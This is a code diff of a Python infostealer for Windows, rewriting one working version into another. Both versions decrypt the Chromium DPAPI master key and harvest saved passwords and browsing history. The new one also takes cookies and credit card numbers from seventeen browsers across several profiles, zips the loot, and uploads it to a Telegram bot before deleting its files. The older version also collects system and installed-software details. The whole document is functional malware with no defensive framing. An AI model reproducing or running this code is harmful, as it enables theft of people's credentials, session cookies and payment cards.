@@ -1,269 +1,232 @@
-import os
-import shutil
-import sqlite3
-import json
 import base64
-import win32crypt
+import json
+import os
+import random
+import sqlite3
+import threading
 from Crypto.Cipher import AES
-import requests
-import socket
-import platform
-import subprocess
+import shutil
 import zipfile
-import importlib.util
-import sys
+import requests
+from typing import Union
+from win32crypt import CryptUnprotectData
 
-bot_token = 'ID-TOKEN'
-chat_id = 'ID-CHAT'
+bot_token = 'token'
+chat_id = 'id'
 
-def check_internet_connection():
-    try:
-        socket.create_connection(("www.google.com", 80), timeout=5)
-        return True
-    except OSError:
-        return False
+class Browsers:
+    def __init__(self):
+        self.appdata = os.getenv('LOCALAPPDATA')
+        self.roaming = os.getenv('APPDATA')
+        self.browsers = {
+            'kometa': self.appdata + '\\Kometa\\User Data',
+            'orbitum': self.appdata + '\\Orbitum\\User Data',
+            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
+            '7star': self.appdata + '\\7Star\\7Star\\User Data',
+            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
+            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
+            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
+            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
+            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
+            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
+            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
+            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
+            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+            'iridium': self.appdata + '\\Iridium\\User Data',
+            'opera': self.roaming + '\\Opera Software\\Opera Stable',
+            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
+            'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
+        }
 
-def get_encryption_key(browser_name):
-    if browser_name in ['Mozilla/Firefox', 'Safari']:
-        return None
-    local_state_path = os.path.join(os.environ['LOCALAPPDATA'], browser_name, 'User Data', 'Local State')
-    if not os.path.exists(local_state_path):
-        raise FileNotFoundError(f"Local State file not found for {browser_name}")
-    with open(local_state_path, 'r', encoding='utf-8') as file:
-        local_state = json.load(file)
-    key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
-    key = key[5:]  # Remove DPAPI prefix
-    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+        self.profiles = [
+            'Default',
+            'Profile 1',
+            'Profile 2',
+            'Profile 3',
+            'Profile 4',
+            'Profile 5',
+        ]
 
-def decrypt_password(ciphertext, key):
-    try:
-        iv = ciphertext[3:15]
-        payload = ciphertext[15:]
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
-        return decrypted_pass
-    except Exception as e:
-        print("Error decrypting password:", e)
-        return ""
+        self.temp_path = os.path.join(os.path.expanduser("~"), "tmp")
+        os.makedirs(os.path.join(self.temp_path, "Browser"), exist_ok=True)
 
-def save_data_to_file(data, folder, filename):
-    os.makedirs(folder, exist_ok=True)
-    with open(os.path.join(folder, filename), 'w', encoding='utf-8') as file:
-        for entry in data:
-            for key, value in entry.items():
-                file.write(f"{key}: {value}\n")
-            file.write("="*50 + "\n")
+        def process_browser(name, path, profile, func):
+            try:
+                func(name, path, profile)
+            except Exception:
+                pass
 
-def zip_folder(folder_path, output_file):
-    shutil.make_archive(output_file, 'zip', folder_path)
+        threads = []
+        for name, path in self.browsers.items():
+            if not os.path.isdir(path):
+                continue
 
-def send_file_via_telegram(bot_token, chat_id, file_path):
-    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
-    with open(file_path, 'rb') as file:
-        response = requests.post(url, data={'chat_id': chat_id}, files={'document': file})
-    return response.status_code == 200
-
-def get_browser_data(browser_name, data_type):
-    if browser_name == 'Mozilla/Firefox':
-        return get_firefox_data(data_type)
-    
-    key = get_encryption_key(browser_name)
-    db_path = os.path.join(os.environ['LOCALAPPDATA'], browser_name, 'User Data', 'Default', 'Login Data' if data_type == 'passwords' else 'History')
-    if not os.path.exists(db_path):
-        raise FileNotFoundError(f"{data_type.capitalize()} file not found for {browser_name}")
-    filename = f"{browser_name.replace('/', '_')}_{data_type.capitalize()}.db"
-    shutil.copyfile(db_path, filename)
-
-    data = []
-    db = sqlite3.connect(filename)
-    cursor = db.cursor()
-
-    if data_type == 'passwords':
-        cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
-        for row in cursor.fetchall():
-            origin_url = row[0]
-            action_url = row[1]
-            username = row[2]
-            encrypted_password = row[3]
-            decrypted_password = decrypt_password(encrypted_password, key)
-            if username or decrypted_password:
-                data.append({
-                    'browser': browser_name,
-                    'origin_url': origin_url,
-                    'action_url': action_url,
-                    'username': username,
-                    'password': decrypted_password
-                })
-    elif data_type == 'history':
-        cursor.execute("SELECT url, title, last_visit_time FROM urls")
-        for row in cursor.fetchall():
-            url = row[0]
-            title = row[1]
-            last_visit_time = row[2]
-            data.append({
-                'browser': browser_name,
-                'url': url,
-                'title': title,
-                'last_visit_time': last_visit_time
-            })
-
-    cursor.close()
-    db.close()
-    os.remove(filename)
-
-    return data
-
-def get_firefox_data(data_type):
-    if data_type == 'passwords':
-        db_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles', next(os.listdir(os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles'))), 'logins.json')
-        if not os.path.exists(db_path):
-            raise FileNotFoundError(f"Logins file not found for Mozilla Firefox")
-        with open(db_path, 'r', encoding='utf-8') as file:
-            logins = json.load(file)
-            passwords = []
-            for login in logins['logins']:
-                passwords.append({
-                    'browser': 'Mozilla/Firefox',
-                    'origin_url': login['hostname'],
-                    'action_url': '',
-                    'username': login['username'],
-                    'password': login['password']
-                })
-            return passwords
-
-    elif data_type == 'history':
-        db_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles', next(os.listdir(os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles'))), 'places.sqlite')
-        if not os.path.exists(db_path):
-            raise FileNotFoundError(f"History file not found for Mozilla Firefox")
-        filename = 'Firefox_History.db'
-        shutil.copyfile(db_path, filename)
-        
-        data = []
-        db = sqlite3.connect(filename)
-        cursor = db.cursor()
-        cursor.execute("SELECT url, title, last_visit_date FROM moz_places")
-        for row in cursor.fetchall():
-            url = row[0]
-            title = row[1]
-            last_visit_time = row[2]
-            data.append({
-                'browser': 'Mozilla/Firefox',
-                'url': url,
-                'title': title,
-                'last_visit_time': last_visit_time
-            })
-
-        cursor.close()
-        db.close()
-        os.remove(filename)
-
-        return data
-
-def get_computer_model():
-    try:
-        model = platform.uname().machine
-        if not model:
-            model = 'Unknown_Model'
-        return model
-    except Exception as e:
-        print(f"Error retrieving computer model: {e}")
-        return 'Unknown_Model'
-
-def collect_apps_info():
-    apps_info_file = os.path.join(os.getenv('TEMP'), 'apps_info.txt')
-    try:
-        process = subprocess.Popen(
-            ['powershell', '-ExecutionPolicy', 'ByPass', '-Command', 
-             f'Get-WmiObject -Class Win32_Product | Select-Object Name, Version | Format-Table -AutoSize | Out-File -FilePath {apps_info_file}'],
-            creationflags=subprocess.CREATE_NO_WINDOW,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE
-        )
-        stdout, stderr = process.communicate()
-        if process.returncode != 0:
-            print(f"Error collecting apps info: {stderr.decode()}")
-    except Exception as e:
-        print(f"Error: {e}")
-    return apps_info_file
-
-def collect_system_info():
-    temp_info_file = os.path.join(os.getenv('TEMP'), 'system_info.txt')
-    try:
-        with open(temp_info_file, 'w') as file:
-            file.write('System Information:\n')
-            commands = [
-                'wmic computersystem get model',
-                'wmic cpu get caption',
-                'wmic memorychip get capacity',
-                'wmic logicaldisk get size,caption',
-                'systeminfo'
+            self.masterkey = self.get_master_key(path + '\\Local State')
+            self.funcs = [
+                self.cookies,
+                self.history,
+                self.passwords,
+                self.credit_cards
             ]
-            for cmd in commands:
-                result = subprocess.check_output(cmd, shell=True).decode()
-                file.write(result)
-    except Exception as e:
-        print(f"Error collecting system info: {e}")
-    return temp_info_file
 
-def main():
-    if not check_internet_connection():
-        print("No internet connection detected. Exiting...")
-        return
-    
-    # List of popular browsers
-    browsers = [
-        'Google/Chrome',
-        'CocCoc/Browser',
-        'Microsoft/Edge',
-        'Opera/Opera',
-        'BraveSoftware/Brave-Browser',
-        'Vivaldi/Application',
-        'Epic Privacy Browser',
-        'Comodo/Dragon',
-        'Mozilla/Firefox',
-        'Safari'
-    ]
+            for profile in self.profiles:
+                for func in self.funcs:
+                    thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
+                    thread.start()
+                    threads.append(thread)
 
-    base_folder = 'Browser_Data'
-    os.makedirs(base_folder, exist_ok=True)
+        for thread in threads:
+            thread.join()
 
-    # Collect browser data
-    for browser in browsers:
+        self.create_zip_and_send()
+
+    def get_master_key(self, path: str) -> str:
         try:
-            passwords = get_browser_data(browser, 'passwords')
-            history = get_browser_data(browser, 'history')
+            with open(path, "r", encoding="utf-8") as f:
+                c = f.read()
+            local_state = json.loads(c)
+            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            master_key = master_key[5:]
+            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+            return master_key
+        except Exception:
+            pass
 
-            passwords_folder = os.path.join(base_folder, 'Passwords', browser.replace('/', '_'))
-            history_folder = os.path.join(base_folder, 'History', browser.replace('/', '_'))
-            save_data_to_file(passwords, passwords_folder, f"{browser.replace('/', '_')}_Passwords.txt")
-            save_data_to_file(history, history_folder, f"{browser.replace('/', '_')}_History.txt")
+    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        return decrypted_pass
 
-        except FileNotFoundError as e:
-            print(e)
+    def passwords(self, name: str, path: str, profile: str):
+        if name == 'opera' or name == 'opera-gx':
+            path += '\\Login Data'
+        else:
+            path += '\\' + profile + '\\Login Data'
+        if not os.path.isfile(path):
+            return
+        conn = sqlite3.connect(path)
+        cursor = conn.cursor()
+        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+        password_file_path = os.path.join(self.temp_path, "Browser", "passwords.txt")
+        for results in cursor.fetchall():
+            if not results[0] or not results[1] or not results[2]:
+                continue
+            url = results[0]
+            login = results[1]
+            password = self.decrypt_password(results[2], self.masterkey)
+            with open(password_file_path, "a", encoding="utf-8") as f:
+                if os.path.getsize(password_file_path) == 0:
+                    f.write("Website  |  Username  |  Password\n\n")
+                f.write(f"{url}  |  {login}  |  {password}\n")
+        cursor.close()
+        conn.close()
 
-    # Collect system and application info
-    system_info_file = collect_system_info()
-    apps_info_file = collect_apps_info()
+    def cookies(self, name: str, path: str, profile: str):
+        if name == 'opera' or name == 'opera-gx':
+            path += '\\Network\\Cookies'
+        else:
+            path += '\\' + profile + '\\Network\\Cookies'
+        if not os.path.isfile(path):
+            return
+        cookievault = self.create_temp()
+        shutil.copy2(path, cookievault)
+        conn = sqlite3.connect(cookievault)
+        cursor = conn.cursor()
+        with open(os.path.join(self.temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
+            f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
+            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
+                host_key, name, path, encrypted_value, expires_utc = res
+                value = self.decrypt_password(encrypted_value, self.masterkey)
+                if host_key and name and value != "":
+                    f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
+        cursor.close()
+        conn.close()
+        os.remove(cookievault)
 
-    # Create the zip file
-    computer_model = get_computer_model()
-    zip_filename = f"{computer_model}_BrowserData"
-    zip_folder(base_folder, zip_filename)
+    def history(self, name: str, path: str, profile: str):
+        if name == 'opera' or name == 'opera-gx':
+            path += '\\History'
+        else:
+            path += '\\' + profile + '\\History'
+        if not os.path.isfile(path):
+            return
+        conn = sqlite3.connect(path)
+        cursor = conn.cursor()
+        history_file_path = os.path.join(self.temp_path, "Browser", "history.txt")
+        with open(history_file_path, 'a', encoding="utf-8") as f:
+            if os.path.getsize(history_file_path) == 0:
+                f.write("Url  |  Visit Count\n\n")
+            for res in cursor.execute("SELECT url, visit_count FROM urls").fetchall():
+                url, visit_count = res
+                f.write(f"{url}  |  {visit_count}\n")
+        cursor.close()
+        conn.close()
 
-    # Add additional files to the zip
-    with zipfile.ZipFile(f"{zip_filename}.zip", 'a') as zipf:
-        zipf.write(system_info_file, os.path.basename(system_info_file))
-        zipf.write(apps_info_file, os.path.basename(apps_info_file))
+    def credit_cards(self, name: str, path: str, profile: str):
+        if name in ['opera', 'opera-gx']:
+            path += '\\Web Data'
+        else:
+            path += '\\' + profile + '\\Web Data'
+        if not os.path.isfile(path):
+            return
+        conn = sqlite3.connect(path)
+        cursor = conn.cursor()
+        cc_file_path = os.path.join(self.temp_path, "Browser", "cc's.txt")
+        with open(cc_file_path, 'a', encoding="utf-8") as f:
+            if os.path.getsize(cc_file_path) == 0:
+                f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
+            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
+                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
+                card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
+                f.write(f"{name_on_card}  |  {expiration_month}  |  {expiration_year}  |  {card_number}\n")
+        cursor.close()
+        conn.close()
 
-    if send_file_via_telegram(bot_token, chat_id, f"{zip_filename}.zip"):
-        print(f"File {zip_filename}.zip sent successfully.")
-    else:
-        print(f"Failed to send file {zip_filename}.zip.")
+    def create_zip_and_send(self):
+        file_paths = [
+            os.path.join(self.temp_path, "Browser", "passwords.txt"),
+            os.path.join(self.temp_path, "Browser", "cookies.txt"),
+            os.path.join(self.temp_path, "Browser", "history.txt"),
+            os.path.join(self.temp_path, "Browser", "cc's.txt")
+        ]
+        zip_file_path = os.path.join(self.temp_path, "BrowserData.zip")
+        self.create_zip(file_paths, zip_file_path)
+        self.send_file_to_telegram(zip_file_path)
 
-    shutil.rmtree(base_folder)
-    os.remove(f"{zip_filename}.zip")
-    os.remove(system_info_file)
-    os.remove(apps_info_file)
+        for file in file_paths:
+            if os.path.isfile(file):
+                os.remove(file)
+        if os.path.isfile(zip_file_path):
+            os.remove(zip_file_path)
+
+    def create_zip(self, file_paths: list, zip_path: str):
+        with zipfile.ZipFile(zip_path, 'w') as zipf:
+            for file in file_paths:
+                if os.path.isfile(file):
+                    zipf.write(file, os.path.basename(file))
+
+    def send_file_to_telegram(self, file_path: str):
+        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+        with open(file_path, 'rb') as file:
+            response = requests.post(
+                url,
+                files={'document': file},
+                data={'chat_id': chat_id}
+            )
+        return response
+
+    def create_temp(self, _dir: Union[str, os.PathLike] = None):
+        if _dir is None:
+            _dir = os.path.expanduser("~/tmp")
+        if not os.path.exists(_dir):
+            os.makedirs(_dir)
+        file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
+        path = os.path.join(_dir, file_name)
+        open(path, "x").close()
+        return path
 
 if __name__ == "__main__":
-    main()
+    Browsers()
